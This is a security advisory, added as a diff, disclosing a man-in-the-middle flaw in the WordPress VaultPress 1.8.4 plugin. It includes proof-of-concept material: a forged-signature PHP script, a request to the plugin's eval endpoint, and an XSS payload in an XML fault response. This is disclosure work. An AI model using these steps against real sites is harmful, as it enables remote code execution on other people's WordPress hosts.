@@ -1,0 +1,158 @@
+id: 27197
+date: 03/05/2017
+title: WordPress VaultPress 1.8.4 Remote Code Execution / Man-In-The-Middle Vulnerabilities
+author: David Vaartjes
+cves: 
+
+------------------------------------------------------------------------
+VaultPress - Remote Code Execution via Man in The Middle attack
+------------------------------------------------------------------------
+David Vaartjes, July 2016
+
+------------------------------------------------------------------------
+Abstract
+------------------------------------------------------------------------
+A Man in The Middle (MiTM) vulnerability has been identified in the
+VaultPress plugin of WordPress. This issue allows an attacker to to
+sniff clear-text communication and to run arbitrary PHP code on the
+affected WordPress host.
+
+------------------------------------------------------------------------
+OVE ID
+------------------------------------------------------------------------
+OVE-20160728-0002
+
+------------------------------------------------------------------------
+Tested versions
+------------------------------------------------------------------------
+This issue was successfully tested on VaultPress WordPress Plugin
+version 1.8.4
+
+------------------------------------------------------------------------
+Fix
+------------------------------------------------------------------------
+There is currently no fix available.
+
+------------------------------------------------------------------------
+Details
+------------------------------------------------------------------------
+https://sumofpwn.nl/advisory/2016/vaultpress___remote_code_execution_via_man_in_the_middle_attack.html
+
+Altough https (SSL) is used to communicate with the VaultPress backend (https://www.vaultpress.com), the server's SSL certificate is not verified by the plugin, which allows for Man in The Middle attacks to intercept (read/write) all traffic.
+
+From a code perspective: when the query() method of the VaultPress_IXR_SSL_Client class is called and the WP_Http class has been defined, the sslverify attribute is set to false. The involved code in the vaultpress/class.vaultpress-ixr-ssl-client.php file is listed below:
+
+
+[..]
+if ( class_exists( 'WP_Http' ) ) {
+$args = array(
+'method' => 'POST',
+'body' => $xml,
+'headers' => $this->headers,
+--> 'sslverify' => false,
+);
+if ( $this->timeout )
+[..]
+
+Once being possisioned as a MiTM, we've analysed if we could exploit this to also run arbitrary code on the WP server running the VaultPress plugin. Multiple possibilities exist.
+Attack vector #1 - targeting vulnerable instance during registration using PHP's eval() function
+
+If the MiTM attack is executed during registration (small change since this happens only once) the secret returned by the VaultPress server can be intercepted. Once obtained, the key can be used to communicatie with the WordPress host's VaultPress API, which offers a friendly method to run any PHP code you send to it directly using eval().
+
+
+[..]
+switch ( $_GET['action'] ) {
+default:
+die();
+break;
+--> case 'exec':
+--> $code = $_POST['code'];
+if ( !$code )
+$this->response( "No Code Found" );
+--> $syntax_check = @eval( 'return true;' . $code );
+if ( !$syntax_check )
+$this->response( "Code Failed Syntax Check" );
+$this->response( eval( $code . ';' ) );
+die();
+break;
+[..]
+
+The above code can be triggered using the following request:
+
+POST /wp-load.php?vaultpress=true&action=exec HTTP/1.1
+Host: <target>
+Connection: close
+Content-Length: 67
+Content-Type: application/x-www-form-urlencoded
+
+code=phpinfo();&signature=5f3db7516912e6b30422a17c1d0bf49beedd6de8:
+
+Please note that a valid signature is required. To create it, the secret value is needed, which seems to be exchanged during registration only. So again, this seems only to affects installations that were targeted by a MiTM during registration. I didn't checked this out, but it might be possible that the secret is included in the backup, such that it can be stolen at backup time as well by a MiTM.
+
+The following script can be used to create the signature:
+
+<?php
+/**
+** Generate Vaultpress API signature using MiTM'd secret
+**/
+
+$secret = "MITMD SECRET HERE";
+$uri = "?vaultpress=true&action=exec";
+$sig = ":";
+$post = Array
+(
+'code' => "phpinfo();",
+);
+
+ksort( $post );
+$sig = explode( ':', $sig );
+$to_sign = serialize( array( 'uri' => $uri, 'post' => $post ) );
+$signature = hash_hmac( 'sha1', "$to_sign:", $secret );
+
+echo "Signature :". $signature;
+?>
+
+
+Attack vector #2 - targeting vulnerable instance after registration using script injection
+
+If a MiTM attack is launched against a host which is already registered, the secret value cannot be intercepted. However, during any communication initiated by a user from the VaultPress plugin page (for example during backups) messages are exchanged between the WordPress host and the vaulpress.com backend.
+
+Responses from the server lack any encoding when shown in the plugin's dashboard HTML pages. This allows a MiTM to inject scripting code in the target user's WordPress Admin panel. Effectively, in WordPress, this is game-over since XSS in the Admin Panel can be used to run arbitrary PHP code as well.
+
+An example of objects lacking output encoding are the ui_message objects. The vulnerable code in the vaultpress/vaultpress.php file is as follows:
+
+<div id="vp-notice" class="vp-notice vp-<?php echo $type; ?> wrap clearfix">
+<div class="vp-message">
+--> <h3><?php echo $heading; ?></h3>
+--> <p><?php echo $message; ?></p>
+</div>
+</div>
+
+To exploit this the following XML (faultcode) can be returned using an XML API call via a MiTM attack. Note the scripting code in the faultString field.
+
+
+<?xml version="1.0"?>
+<methodResponse>
+<fault>
+<value>
+<struct>
+<member>
+<name>faultCode</name>
+<value><int>-5</int></value>
+</member>
+<member>
+<name>faultString</name>
+--> <value><string><![CDATA[<script>alert("XSS");</script>]]></string></value>
+</member>
+</struct>
+</value>
+</fault>
+</methodResponse>
+
+
+------------------------------------------------------------------------
+Summer of Pwnage (https://sumofpwn.nl) is a Dutch community project. Its
+goal is to contribute to the security of popular, widely used OSS
+projects in a fun and educational way.
+
+#  0day.today [2023-03-22]  #
